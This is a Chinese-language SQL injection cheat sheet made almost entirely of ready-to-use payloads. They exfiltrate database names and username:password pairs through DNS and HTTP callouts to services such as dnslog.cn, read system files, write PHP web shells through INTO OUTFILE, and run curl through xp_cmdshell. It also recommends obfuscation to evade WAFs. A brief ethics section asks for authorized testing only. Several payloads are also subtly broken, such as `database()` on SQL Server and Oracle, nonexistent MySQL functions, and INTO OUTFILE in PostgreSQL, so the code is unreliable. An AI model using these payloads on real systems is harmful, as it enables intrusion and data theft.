# SQL 注入数据外带验证速查表

## 目录

1. [数据外带概述](#数据外带概述)
2. [DNS 外带速查](#dns-外带速查)
3. [HTTP 外带速查](#http-外带速查)
4. [文件外带速查](#文件外带速查)
5. [错误外带速查](#错误外带速查)
6. [时间外带速查](#时间外带速查)
7. [数据库特定外带](#数据库特定外带)
8. [外带服务对比](#外带服务对比)
9. [实战案例速查](#实战案例速查)

---

## 数据外带概述

### 为什么使用数据外带？

**直接显示的缺点**：
- ❌ 容易被目标系统察觉
- ❌ 可能被 WAF 拦截
- ❌ 数据可能被截断
- ❌ 不适合盲注场景

**数据外带的优点**：
- ✅ 隐蔽性强，不易被察觉
- ✅ 可以绕过 WAF 检测
- ✅ 适合盲注场景
- ✅ 可以外带大量数据
- ✅ 为漏洞报告提供有力证据

### 数据外带类型

- **DNS 外带**：通过 DNS 查询外带数据
- **HTTP 外带**：通过 HTTP 请求外带数据
- **文件外带**：通过文件读写外带数据
- **错误外带**：通过错误信息外带数据
- **时间外带**：通过响应时间外带数据

---

## DNS 外带速查

### MySQL DNS 外带

```sql
-- 使用 LOAD_FILE 函数
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog.cn\\test'))

-- 使用 LOAD_FILE 函数（编码）
SELECT LOAD_FILE(CONCAT('\\\\', HEX((SELECT database())), '.dnslog.cn\\test'))

-- 使用 LOAD_FILE 函数（完整路径）
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog.cn\\', (SELECT user()), '\\test'))
```

### PostgreSQL DNS 外带

```sql
-- 使用 dblink 函数
SELECT dblink_send_query('dnslog.cn', 'SELECT 1')

-- 使用 copy_to 函数
COPY (SELECT database()) TO PROGRAM 'nslookup ' || (SELECT database()) || '.dnslog.cn'
```

### SQL Server DNS 外带

```sql
-- 使用 xp_dirtree 函数
DECLARE @host VARCHAR(1024);
SELECT @host = (SELECT database()) + '.dnslog.cn';
EXEC master..xp_dirtree '\\\\' + @host + '\\test';

-- 使用 xp_fileexist 函数
DECLARE @host VARCHAR(1024);
SELECT @host = (SELECT database()) + '.dnslog.cn';
EXEC master..xp_fileexist '\\\\' + @host + '\\test';
```

### Oracle DNS 外带

```sql
-- 使用 UTL_HTTP 函数
SELECT UTL_HTTP.REQUEST('http://' || (SELECT database()) || '.dnslog.cn') FROM dual;

-- 使用 UTL_INADDR 函数
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT database()) || '.dnslog.cn') FROM dual;
```

### SQLite DNS 外带

```sql
-- 使用 load_extension 函数（需要特定扩展）
SELECT load_extension('dnslog.cn', (SELECT database()))
```

---

## HTTP 外带速查

### MySQL HTTP 外带

```sql
-- 使用 LOAD_FILE 函数（仅限本地文件）
SELECT LOAD_FILE('http://dnslog.cn/' || (SELECT database()))

-- 使用 INTO OUTFILE 函数（写入 Web Shell）
SELECT '<?php file_get_contents("http://dnslog.cn/" . $_GET["data"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- 使用 UDF（需要特定权限）
SELECT http_get('http://dnslog.cn/' || (SELECT database()))
```

### PostgreSQL HTTP 外带

```sql
-- 使用 dblink 函数
SELECT dblink_connect('host=dnslog.cn user=test dbname=test')

-- 使用 copy_to 函数
COPY (SELECT database()) TO PROGRAM 'curl http://dnslog.cn/' || (SELECT database())
```

### SQL Server HTTP 外带

```sql
-- 使用 xp_cmdshell 函数
EXEC xp_cmdshell 'curl http://dnslog.cn/' + (SELECT DB_NAME())

-- 使用 OLE 自动化
DECLARE @url VARCHAR(1024);
SELECT @url = 'http://dnslog.cn/' + (SELECT DB_NAME());
EXEC sp_OACreate 'MSXML2.XMLHTTP', @obj OUT;
EXEC sp_OAMethod @obj, 'open', NULL, 'GET', @url, false;
EXEC sp_OAMethod @obj, 'send';
```

### Oracle HTTP 外带

```sql
-- 使用 UTL_HTTP 函数
SELECT UTL_HTTP.REQUEST('http://dnslog.cn/' || (SELECT SYS.DATABASE_NAME FROM dual)) FROM dual;

-- 使用 UTL_URL 函数
SELECT UTL_URL.ESCAPE('http://dnslog.cn/' || (SELECT SYS.DATABASE_NAME FROM dual)) FROM dual;
```

---

## 文件外带速查

### MySQL 文件外带

```sql
-- 读取文件
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')

-- 写入文件
SELECT 'test' INTO OUTFILE '/tmp/test.txt'
SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- 写入二进制文件
SELECT 0x3c3f7068702073797374656d28245f4745545b636d645d293b203f3e INTO OUTFILE '/var/www/html/shell.php'

-- 写入编码数据
SELECT HEX((SELECT database())) INTO OUTFILE '/tmp/database.txt'
SELECT BASE64_ENCODE((SELECT database())) INTO OUTFILE '/tmp/database.txt'
```

### PostgreSQL 文件外带

```sql
-- 读取文件（需要特定权限）
SELECT pg_read_file('/etc/passwd', 0, 100)

-- 写入文件（需要特定权限）
COPY (SELECT 'test') TO '/tmp/test.txt'
COPY (SELECT (SELECT database())) TO '/tmp/database.txt'
```

### SQL Server 文件外带

```sql
-- 读取文件（需要特定权限）
EXEC xp_cmdshell 'type C:\\Windows\\System32\\drivers\\etc\\hosts'

-- 写入文件（需要特定权限）
EXEC xp_cmdshell 'echo test > C:\\test.txt'
EXEC xp_cmdshell 'echo ' + (SELECT DB_NAME()) + ' > C:\\database.txt'
```

### Oracle 文件外带

```sql
-- 读取文件（需要特定权限）
SELECT UTL_FILE.FOPEN('/tmp', 'test.txt', 'R') FROM dual

-- 写入文件（需要特定权限）
DECLARE
  file_handle UTL_FILE.FILE_TYPE;
BEGIN
  file_handle := UTL_FILE.FOPEN('/tmp', 'test.txt', 'W');
  UTL_FILE.PUT_LINE(file_handle, 'test');
  UTL_FILE.FCLOSE(file_handle);
END;
```

---

## 错误外带速查

### MySQL 错误外带

```sql
-- 使用 CAST 错误注入
AND 1=CAST((SELECT database()) AS INT)

-- 使用 EXTRACTVALUE 错误注入
AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))

-- 使用 UPDATEXML 错误注入
AND 1=UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)

-- 使用 FLOOR 错误注入
AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

-- 使用 GROUP BY 错误注入
AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

### PostgreSQL 错误外带

```sql
-- 使用 CAST 错误注入
AND 1=CAST((SELECT database()) AS INT)

-- 使用类型转换错误
AND 1=CONVERT((SELECT database()),INT)
```

### SQL Server 错误外带

```sql
-- 使用 CONVERT 错误注入
AND 1=CONVERT(INT,(SELECT database()))

-- 使用 CAST 错误注入
AND 1=CAST((SELECT database()) AS INT)

-- 使用 HAVING 错误注入
AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U' HAVING 1=1)
```

### Oracle 错误外带

```sql
-- 使用 CAST 错误注入
AND 1=CAST((SELECT database()) AS NUMBER)

-- 使用 TO_NUMBER 错误注入
AND 1=TO_NUMBER((SELECT database()))

-- 使用 UTL_INADDR 错误注入
AND 1=UTL_INADDR.GET_HOST_NAME((SELECT database()))
```

---

## 时间外带速查

### MySQL 时间外带

```sql
-- 使用 SLEEP 函数
AND IF((SELECT database())='testdb',SLEEP(5),0)

-- 使用 BENCHMARK 函数
AND IF((SELECT database())='testdb',BENCHMARK(5000000,MD5(1)),0)

-- 使用笛卡尔积
AND IF((SELECT database())='testdb',(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B),0)
```

### PostgreSQL 时间外带

```sql
-- 使用 pg_sleep 函数
AND CASE WHEN (SELECT database())='testdb' THEN pg_sleep(5) ELSE 0 END

-- 使用 dblink 函数
AND CASE WHEN (SELECT database())='testdb' THEN dblink_connect('host=127.0.0.1 user=test dbname=test') ELSE 0 END
```

### SQL Server 时间外带

```sql
-- 使用 WAITFOR DELAY 函数
AND CASE WHEN (SELECT DB_NAME())='testdb' THEN WAITFOR DELAY '0:0:5' ELSE 0 END

-- 使用 xp_cmdshell 函数
AND CASE WHEN (SELECT DB_NAME())='testdb' THEN xp_cmdshell 'ping -n 6 127.0.0.1' ELSE 0 END
```

### Oracle 时间外带

```sql
-- 使用 DBMS_PIPE.RECEIVE_MESSAGE 函数
AND CASE WHEN (SELECT SYS.DATABASE_NAME FROM dual)='TESTDB' THEN DBMS_PIPE.RECEIVE_MESSAGE('X',5) ELSE 0 END

-- 使用 DBMS_LOCK.SLEEP 函数
AND CASE WHEN (SELECT SYS.DATABASE_NAME FROM dual)='TESTDB' THEN DBMS_LOCK.SLEEP(5) ELSE 0 END
```

---

## 数据库特定外带

### MySQL 特定外带

```sql
-- DNS 外带
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog.cn\\test'))

-- 文件外带
SELECT (SELECT database()) INTO OUTFILE '/tmp/database.txt'

-- 错误外带
AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))

-- 时间外带
AND IF((SELECT database())='testdb',SLEEP(5),0)
```

### PostgreSQL 特定外带

```sql
-- DNS 外带
SELECT dblink_send_query('dnslog.cn', 'SELECT 1')

-- 文件外带
COPY (SELECT database()) TO '/tmp/database.txt'

-- 错误外带
AND 1=CAST((SELECT database()) AS INT)

-- 时间外带
AND CASE WHEN (SELECT database())='testdb' THEN pg_sleep(5) ELSE 0 END
```

### SQL Server 特定外带

```sql
-- DNS 外带
DECLARE @host VARCHAR(1024);
SELECT @host = (SELECT DB_NAME()) + '.dnslog.cn';
EXEC master..xp_dirtree '\\\\' + @host + '\\test';

-- 文件外带
EXEC xp_cmdshell 'echo ' + (SELECT DB_NAME()) + ' > C:\\database.txt'

-- 错误外带
AND 1=CONVERT(INT,(SELECT database()))

-- 时间外带
AND CASE WHEN (SELECT DB_NAME())='testdb' THEN WAITFOR DELAY '0:0:5' ELSE 0 END
```

### Oracle 特定外带

```sql
-- DNS 外带
SELECT UTL_HTTP.REQUEST('http://' || (SELECT SYS.DATABASE_NAME FROM dual) || '.dnslog.cn') FROM dual;

-- 文件外带
DECLARE
  file_handle UTL_FILE.FILE_TYPE;
BEGIN
  file_handle := UTL_FILE.FOPEN('/tmp', 'database.txt', 'W');
  UTL_FILE.PUT_LINE(file_handle, (SELECT SYS.DATABASE_NAME FROM dual));
  UTL_FILE.FCLOSE(file_handle);
END;

-- 错误外带
AND 1=CAST((SELECT SYS.DATABASE_NAME FROM dual) AS NUMBER)

-- 时间外带
AND CASE WHEN (SELECT SYS.DATABASE_NAME FROM dual)='TESTDB' THEN DBMS_PIPE.RECEIVE_MESSAGE('X',5) ELSE 0 END
```

---

## 外带服务对比

| 服务 | 官方网站 | 优点 | 缺点 | 适用场景 |
|------|----------|------|------|---------|
| **DNSLog.cn** | http://www.dnslog.cn/ | 免费、无需注册、实时查看 | 依赖网络连接、可能被拦截 | 快速验证、自动化测试 |
| **Burp Collaborator** | https://portswigger.net/burp/documentation/collaborator | 支持多种协议、实时接收 | 需要 Burp Suite | 专业渗透测试 |
| **CeYE** | http://ceye.io/ | 免费、支持多种协议 | 需要注册 | 快速验证、自动化测试 |
| **RequestBin** | https://requestbin.com/ | 免费、实时查看 HTTP | 仅支持 HTTP | HTTP 请求分析 |
| **Webhook.site** | https://webhook.site/ | 免费、支持多种格式 | 仅支持 Webhook | Webhook 测试 |

---

## 外带服务详细说明

### DNSLog.cn

**官方网站**：http://www.dnslog.cn/

**特点**：
- 免费、无需注册
- 实时查看 DNS 查询记录
- 支持自定义子域名

**使用方法**：
1. 访问 `http://www.dnslog.cn/`
2. 查看当前可用的子域名
3. 在 Payload 中使用该子域名
4. 刷新页面查看 DNS 查询记录

**示例**：
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog.cn\\test'))
```

### Burp Collaborator

**官方网站**：https://portswigger.net/burp/documentation/collaborator

**特点**：
- Burp Suite 自带
- 支持 DNS、HTTP、SMTP 等多种协议
- 实时接收和查看外带数据

**安装方法**：
1. 下载 Burp Suite：https://portswigger.net/burp/releases
2. 安装 Burp Suite Professional（或使用免费版）
3. 启动 Burp Suite
4. 在 Burp Suite 菜单中选择 "Burp Collaborator Client"

**使用方法**：
1. 打开 Burp Suite
2. 进入 Burp Collaborator Client
3. 生成一个新的 Collaborator Payload
4. 在测试中使用该 Payload
5. 在 Collaborator Client 中查看结果

**示例**：
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.your-collaborator-payload.burpcollaborator.net\\test'))
```

### CeYE

**官方网站**：http://ceye.io/

**特点**：
- 免费、需要注册
- 支持 DNS、HTTP、SMTP 等多种协议
- 实时查看外带数据

**使用方法**：
1. 访问 `http://ceye.io/`
2. 注册账户
3. 查看专属的子域名
4. 在 Payload 中使用该子域名
5. 在 CeYE 平台查看结果

**示例**：
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.your-ceye-domain.ceye.io\\test'))
```

---

## 实战案例速查

### 案例 1：MySQL DNS 外带

**目标**：`http://example.com/product?id=1`

**Payload**：
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog.cn\\test'))
```

**步骤**：
1. 访问 `http://www.dnslog.cn/` 获取子域名
2. 在参数中注入 Payload：`1' AND 1=LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog.cn\\test'))--`
3. 在 DNSLog.cn 页面查看 DNS 查询记录
4. 解析查询记录获取数据库名

### 案例 2：PostgreSQL DNS 外带

**目标**：`http://example.com/product?id=1`

**Payload**：
```sql
SELECT dblink_send_query('dnslog.cn', 'SELECT 1')
```

**步骤**：
1. 访问 `http://www.dnslog.cn/` 获取子域名
2. 在参数中注入 Payload：`1' AND 1=dblink_send_query('dnslog.cn', 'SELECT 1')--`
3. 在 DNSLog.cn 页面查看 DNS 查询记录
4. 验证漏洞存在

### 案例 3：SQL Server DNS 外带

**目标**：`http://example.com/product?id=1`

**Payload**：
```sql
DECLARE @host VARCHAR(1024);
SELECT @host = (SELECT DB_NAME()) + '.dnslog.cn';
EXEC master..xp_dirtree '\\\\' + @host + '\\test';
```

**步骤**：
1. 访问 `http://www.dnslog.cn/` 获取子域名
2. 在参数中注入 Payload：`1'; DECLARE @host VARCHAR(1024); SELECT @host = (SELECT DB_NAME()) + '.dnslog.cn'; EXEC master..xp_dirtree '\\\\' + @host + '\\test';--`
3. 在 DNSLog.cn 页面查看 DNS 查询记录
4. 解析查询记录获取数据库名

### 案例 4：Oracle HTTP 外带

**目标**：`http://example.com/product?id=1`

**Payload**：
```sql
SELECT UTL_HTTP.REQUEST('http://dnslog.cn/' || (SELECT SYS.DATABASE_NAME FROM dual)) FROM dual;
```

**步骤**：
1. 访问 `http://www.dnslog.cn/` 获取子域名
2. 在参数中注入 Payload：`1' AND 1=UTL_HTTP.REQUEST('http://dnslog.cn/' || (SELECT SYS.DATABASE_NAME FROM dual))--`
3. 在 DNSLog.cn 页面查看 HTTP 请求记录
4. 解析请求记录获取数据库名

### 案例 5：MySQL 文件外带

**目标**：`http://example.com/product?id=1`

**Payload**：
```sql
SELECT (SELECT database()) INTO OUTFILE '/tmp/database.txt'
```

**步骤**：
1. 在参数中注入 Payload：`1' AND 1=(SELECT (SELECT database()) INTO OUTFILE '/tmp/database.txt')--`
2. 通过其他方式访问 `/tmp/database.txt` 文件
3. 获取数据库名

### 案例 6：MySQL 错误外带

**目标**：`http://example.com/product?id=1`

**Payload**：
```sql
AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))
```

**步骤**：
1. 在参数中注入 Payload：`1' AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--`
2. 观察错误信息
3. 从错误信息中提取数据库名

### 案例 7：MySQL 时间外带

**目标**：`http://example.com/product?id=1`

**Payload**：
```sql
AND IF((SELECT database())='testdb',SLEEP(5),0)
```

**步骤**：
1. 在参数中注入 Payload：`1' AND IF((SELECT database())='testdb',SLEEP(5),0)--`
2. 观察响应时间
3. 如果响应时间超过 5 秒，说明数据库名为 'testdb'

---

## 编码外带速查

### Base64 编码外带

```sql
-- MySQL
SELECT BASE64_ENCODE((SELECT database())) INTO OUTFILE '/tmp/database.txt'

-- PostgreSQL
SELECT ENCODE((SELECT database()), 'base64') INTO OUTFILE '/tmp/database.txt'
```

### HEX 编码外带

```sql
-- MySQL
SELECT HEX((SELECT database())) INTO OUTFILE '/tmp/database.txt'

-- PostgreSQL
SELECT ENCODE((SELECT database()), 'hex') INTO OUTFILE '/tmp/database.txt'
```

### URL 编码外带

```sql
-- MySQL
SELECT URL_ENCODE((SELECT database())) INTO OUTFILE '/tmp/database.txt'

-- PostgreSQL
SELECT ENCODE((SELECT database()), 'url') INTO OUTFILE '/tmp/database.txt'
```

---

## 批量外带速查

### 批量外带表名

```sql
-- MySQL
SELECT GROUP_CONCAT(table_name) INTO OUTFILE '/tmp/tables.txt' FROM information_schema.tables WHERE table_schema=database()

-- PostgreSQL
SELECT STRING_AGG(table_name,',') INTO OUTFILE '/tmp/tables.txt' FROM information_schema.tables WHERE table_schema='public'
```

### 批量外带列名

```sql
-- MySQL
SELECT GROUP_CONCAT(column_name) INTO OUTFILE '/tmp/columns.txt' FROM information_schema.columns WHERE table_name='users'

-- PostgreSQL
SELECT STRING_AGG(column_name,',') INTO OUTFILE '/tmp/columns.txt' FROM information_schema.columns WHERE table_name='users'
```

### 批量外带数据

```sql
-- MySQL
SELECT GROUP_CONCAT(username,':',password) INTO OUTFILE '/tmp/users.txt' FROM users

-- PostgreSQL
SELECT STRING_AGG(username||':'||password,',') INTO OUTFILE '/tmp/users.txt' FROM users
```

---

## 安全测试建议

### 道德准则

- ⚠️ **仅限授权测试**：只在获得明确授权的范围内进行测试
- ⚠️ **不要窃取真实数据**：使用测试标识，不要获取真实用户数据
- ⚠️ **及时报告漏洞**：发现漏洞后及时向目标报告
- ⚠️ **遵守法律法规**：遵守所在国家和地区的相关法律法规

### 测试标识

```sql
-- 使用测试标识
SELECT LOAD_FILE(CONCAT('\\\\', 'test-sqli-', (SELECT database()), '.dnslog.cn\\test'))
```

### 数据保护

- **不要在外带数据中发送真实敏感数据**
- **使用编码或加密保护测试数据**
- **测试完成后删除相关记录**

---

## 最佳实践

### 选择合适的外带方法

- **DNS 外带**：适合快速验证、自动化测试
- **HTTP 外带**：适合需要外带大量数据的场景
- **文件外带**：适合有文件读写权限的场景
- **错误外带**：适合有错误信息泄露的场景
- **时间外带**：适合盲注场景

### Payload 设计原则

1. **简洁性**：Payload 尽量简洁，减少被过滤的风险
2. **隐蔽性**：使用编码、混淆等技术提高隐蔽性
3. **可靠性**：确保 Payload 在不同环境下都能正常工作
4. **可追溯性**：使用测试标识，便于追踪和清理

---

**文档版本**: 1.0
**最后更新**: 2026-02-09
